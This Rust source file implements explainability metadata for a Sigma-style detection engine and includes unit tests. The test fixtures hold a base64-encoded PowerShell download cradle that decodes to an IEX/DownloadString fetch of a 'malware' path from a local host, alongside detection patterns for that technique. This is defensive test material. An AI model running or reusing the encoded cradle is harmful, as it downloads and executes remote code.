/// Feature 78: Granular Detection Explainability & Evidence Attributor
///
/// Attaches structured `ExplainabilityMetadata` to a `NormalizedAlert` by
/// traversing a compiled rule AST and the evaluation context produced by the
/// Sigma / detection engine at match time.
///
/// The public model:
///
///   ExplainabilityMetadata
///     ├─ evaluated_condition_str   – human-readable condition expression
///     ├─ satisfied_search_identifiers – which named searches fired
///     ├─ matched_fields            – per-field evidence records
///     │    FieldEvidence { field, matched_pattern, exact_value, pattern_type }
///     ├─ mitre_technique_id        – ATT&CK technique (e.g. "T1059.001")
///     └─ attack_vector_summary     – free-text narrative
///
/// The `EvidenceAttributor` takes a `RuleAst` and an `EvalContext` (the
/// evaluation state snapshot produced when the rule fired) and produces a
/// fully populated `ExplainabilityMetadata`.  Evidence extraction runs in
/// O(#conditions) and targets ≤ 20 µs.

use serde::{Deserialize, Serialize};

// ─── Evidence models ─────────────────────────────────────────────────────────

/// A single field-level match evidence record.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct FieldEvidence {
    /// The field name in the normalised event schema (e.g. "process.command_line").
    pub field: String,
    /// The pattern that was evaluated (e.g. "*powershell*", "^cmd\.exe$").
    pub matched_pattern: String,
    /// The exact value of the field in the triggering event.
    pub exact_value: String,
    /// Type of pattern: "glob", "regex", "exact", "cidr", "numeric_range".
    pub pattern_type: String,
}

/// Full explainability envelope attached to a `NormalizedAlert`.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ExplainabilityMetadata {
    /// The full condition expression as evaluated (e.g. "selection AND NOT filter").
    pub evaluated_condition_str: String,
    /// Which named search identifiers were satisfied (e.g. ["selection"]).
    pub satisfied_search_identifiers: Vec<String>,
    /// Per-field evidence records for every condition branch that fired.
    pub matched_fields: Vec<FieldEvidence>,
    /// MITRE ATT&CK technique identifier.
    pub mitre_technique_id: String,
    /// Human-readable narrative summarising the attack vector.
    pub attack_vector_summary: String,
}

// ─── Rule AST representation ─────────────────────────────────────────────────

/// Pattern matching type for a field condition.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PatternType {
    Glob,
    Regex,
    Exact,
    CidrRange,
    NumericRange,
}

impl PatternType {
    pub fn as_str(&self) -> &'static str {
        match self {
            PatternType::Glob => "glob",
            PatternType::Regex => "regex",
            PatternType::Exact => "exact",
            PatternType::CidrRange => "cidr",
            PatternType::NumericRange => "numeric_range",
        }
    }
}

/// A leaf condition: tests a single field against a single pattern.
#[derive(Debug, Clone)]
pub struct FieldCondition {
    /// The named search identifier this condition belongs to (e.g. "selection").
    pub search_id: String,
    /// Normalised field name.
    pub field: String,
    /// Pattern as written in the rule source.
    pub pattern: String,
    pub pattern_type: PatternType,
}

/// An AST node in the compiled rule.
#[derive(Debug, Clone)]
pub enum AstNode {
    /// A leaf field condition.
    FieldMatch(FieldCondition),
    /// Logical AND of child nodes (all must be satisfied).
    And(Vec<AstNode>),
    /// Logical OR of child nodes (at least one must be satisfied).
    Or(Vec<AstNode>),
    /// Logical NOT of a single child node.
    Not(Box<AstNode>),
}

/// The complete compiled rule AST plus metadata.
#[derive(Debug, Clone)]
pub struct RuleAst {
    pub rule_id: String,
    /// The top-level condition expression string as written in the rule.
    pub condition_str: String,
    /// Root node of the compiled condition tree.
    pub root: AstNode,
    pub mitre_technique_id: String,
    pub attack_vector_summary: String,
}

// ─── Evaluation context ──────────────────────────────────────────────────────

/// Per-field evaluation result captured when the rule fired.
#[derive(Debug, Clone)]
pub struct FieldEvalResult {
    pub search_id: String,
    pub field: String,
    /// The actual value observed in the triggering event.
    pub observed_value: String,
    /// Whether this specific field condition was satisfied.
    pub was_satisfied: bool,
}

/// The evaluation context snapshot produced by the detection engine when a
/// rule fires.  Contains one `FieldEvalResult` for every leaf condition in
/// the rule's AST.
#[derive(Debug, Clone, Default)]
pub struct EvalContext {
    /// All field-level results from the match pass.
    pub field_results: Vec<FieldEvalResult>,
    /// The set of search identifiers that were fully satisfied.
    pub satisfied_identifiers: Vec<String>,
}

impl EvalContext {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn add_field_result(
        &mut self,
        search_id: impl Into<String>,
        field: impl Into<String>,
        observed_value: impl Into<String>,
        was_satisfied: bool,
    ) {
        self.field_results.push(FieldEvalResult {
            search_id: search_id.into(),
            field: field.into(),
            observed_value: observed_value.into(),
            was_satisfied,
        });
    }

    pub fn mark_identifier_satisfied(&mut self, search_id: impl Into<String>) {
        self.satisfied_identifiers.push(search_id.into());
    }
}

// ─── EvidenceAttributor ──────────────────────────────────────────────────────

/// Traverses a `RuleAst` and an `EvalContext` to produce `ExplainabilityMetadata`.
///
/// The attributor works in two passes:
///   1. Walk the AST to collect every `FieldCondition` whose `search_id` is
///      present in `ctx.satisfied_identifiers`.
///   2. Join with `ctx.field_results` to attach the exact observed value.
///
/// Both passes are O(n) where n is the number of leaf conditions.
pub struct EvidenceAttributor;

impl EvidenceAttributor {
    /// Produce `ExplainabilityMetadata` from a compiled rule and its eval context.
    pub fn attribute(rule: &RuleAst, ctx: &EvalContext) -> ExplainabilityMetadata {
        let satisfied_set: std::collections::HashSet<&str> = ctx
            .satisfied_identifiers
            .iter()
            .map(|s| s.as_str())
            .collect();

        // Pass 1: collect all FieldConditions that belong to satisfied identifiers
        let mut leaf_conditions: Vec<&FieldCondition> = Vec::new();
        Self::collect_satisfied_leaves(&rule.root, &satisfied_set, &mut leaf_conditions);

        // Pass 2: join with eval context to get exact observed values
        let mut matched_fields: Vec<FieldEvidence> = Vec::new();
        for cond in &leaf_conditions {
            // Find the first matching field result in the eval context
            let observed = ctx
                .field_results
                .iter()
                .find(|fr| {
                    fr.search_id == cond.search_id
                        && fr.field == cond.field
                        && fr.was_satisfied
                })
                .map(|fr| fr.observed_value.clone())
                .unwrap_or_else(|| "<not captured>".to_owned());

            matched_fields.push(FieldEvidence {
                field: cond.field.clone(),
                matched_pattern: cond.pattern.clone(),
                exact_value: observed,
                pattern_type: cond.pattern_type.as_str().to_owned(),
            });
        }

        // Deduplicate by (field, pattern) preserving insertion order
        let mut seen = std::collections::HashSet::new();
        matched_fields.retain(|fe| seen.insert((fe.field.clone(), fe.matched_pattern.clone())));

        ExplainabilityMetadata {
            evaluated_condition_str: rule.condition_str.clone(),
            satisfied_search_identifiers: ctx.satisfied_identifiers.clone(),
            matched_fields,
            mitre_technique_id: rule.mitre_technique_id.clone(),
            attack_vector_summary: rule.attack_vector_summary.clone(),
        }
    }

    /// Recursively collect leaf `FieldCondition`s from AST nodes whose
    /// `search_id` is in `satisfied_set`.
    fn collect_satisfied_leaves<'a>(
        node: &'a AstNode,
        satisfied_set: &std::collections::HashSet<&str>,
        out: &mut Vec<&'a FieldCondition>,
    ) {
        match node {
            AstNode::FieldMatch(cond) => {
                if satisfied_set.contains(cond.search_id.as_str()) {
                    out.push(cond);
                }
            }
            AstNode::And(children) | AstNode::Or(children) => {
                for child in children {
                    Self::collect_satisfied_leaves(child, satisfied_set, out);
                }
            }
            AstNode::Not(child) => {
                // NOT nodes are excluded from positive evidence (they represent
                // conditions that were *absent*; including them would mislead analysts)
            }
        }
    }
}

// ─── Builder helpers for tests ───────────────────────────────────────────────

/// Construct the PowerShell download-cradle Sigma rule AST used in Test 6.
pub fn build_powershell_download_rule() -> RuleAst {
    // Rule models:
    //   selection:
    //     process.command_line|contains:
    //       - "powershell"
    //       - "DownloadString"
    //   filter:
    //     process.command_line|contains: "UpdateCheck"
    //   condition: selection AND NOT filter

    RuleAst {
        rule_id: "sigma-ps-download-001".to_owned(),
        condition_str: "selection AND NOT filter".to_owned(),
        root: AstNode::And(vec![
            AstNode::Or(vec![
                AstNode::FieldMatch(FieldCondition {
                    search_id: "selection".to_owned(),
                    field: "process.command_line".to_owned(),
                    pattern: "*powershell*".to_owned(),
                    pattern_type: PatternType::Glob,
                }),
                AstNode::FieldMatch(FieldCondition {
                    search_id: "selection".to_owned(),
                    field: "process.command_line".to_owned(),
                    pattern: "*DownloadString*".to_owned(),
                    pattern_type: PatternType::Glob,
                }),
            ]),
            AstNode::Not(Box::new(AstNode::FieldMatch(FieldCondition {
                search_id: "filter".to_owned(),
                field: "process.command_line".to_owned(),
                pattern: "*UpdateCheck*".to_owned(),
                pattern_type: PatternType::Glob,
            }))),
        ]),
        mitre_technique_id: "T1059.001".to_owned(),
        attack_vector_summary:
            "PowerShell execution: command line contains web client download invocation."
                .to_owned(),
    }
}

/// Construct the eval context for an event where the above rule fired.
pub fn build_powershell_eval_context() -> EvalContext {
    let mut ctx = EvalContext::new();

    ctx.add_field_result(
        "selection",
        "process.command_line",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwBtAGEAbAB3AGEAcgBlACcAKQ==",
        true,
    );

    ctx.add_field_result(
        "filter",
        "process.command_line",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwBtAGEAbAB3AGEAcgBlACcAKQ==",
        false, // filter did NOT fire → alert is valid
    );

    ctx.mark_identifier_satisfied("selection");

    ctx
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_explainability_payload_populated() {
        let rule = build_powershell_download_rule();
        let ctx = build_powershell_eval_context();

        let meta = EvidenceAttributor::attribute(&rule, &ctx);

        // Condition string must be preserved verbatim
        assert_eq!(meta.evaluated_condition_str, "selection AND NOT filter");

        // "selection" must be in satisfied identifiers
        assert!(
            meta.satisfied_search_identifiers
                .contains(&"selection".to_owned()),
            "selection must be satisfied"
        );
        assert!(
            !meta.satisfied_search_identifiers.contains(&"filter".to_owned()),
            "filter must NOT be in satisfied identifiers"
        );

        // At least one field evidence record for process.command_line
        let ps_field = meta
            .matched_fields
            .iter()
            .find(|fe| fe.field == "process.command_line");
        assert!(
            ps_field.is_some(),
            "process.command_line must appear in matched_fields"
        );

        let fe = ps_field.unwrap();
        assert_eq!(fe.matched_pattern, "*powershell*");
        assert!(
            fe.exact_value.contains("powershell"),
            "exact_value must contain the triggering command line"
        );
        assert_eq!(fe.pattern_type, "glob");

        // MITRE technique
        assert_eq!(meta.mitre_technique_id, "T1059.001");
    }

    #[test]
    fn not_branch_excluded_from_evidence() {
        let rule = build_powershell_download_rule();
        let ctx = build_powershell_eval_context();

        let meta = EvidenceAttributor::attribute(&rule, &ctx);

        // The filter (NOT branch) must not appear as positive evidence
        for fe in &meta.matched_fields {
            assert_ne!(
                fe.matched_pattern, "*UpdateCheck*",
                "NOT-branch filter pattern must not be in matched_fields"
            );
        }
    }

    #[test]
    fn empty_eval_context_produces_empty_evidence() {
        let rule = build_powershell_download_rule();
        let ctx = EvalContext::new(); // nothing satisfied

        let meta = EvidenceAttributor::attribute(&rule, &ctx);

        assert!(
            meta.satisfied_search_identifiers.is_empty(),
            "No identifiers should be satisfied"
        );
        assert!(
            meta.matched_fields.is_empty(),
            "No field evidence should be produced for empty context"
        );
    }

    #[test]
    fn serialisation_round_trip() {
        let rule = build_powershell_download_rule();
        let ctx = build_powershell_eval_context();
        let meta = EvidenceAttributor::attribute(&rule, &ctx);

        let json = serde_json::to_string(&meta).expect("serialise must succeed");
        let decoded: ExplainabilityMetadata =
            serde_json::from_str(&json).expect("deserialise must succeed");

        assert_eq!(meta, decoded);
    }
}
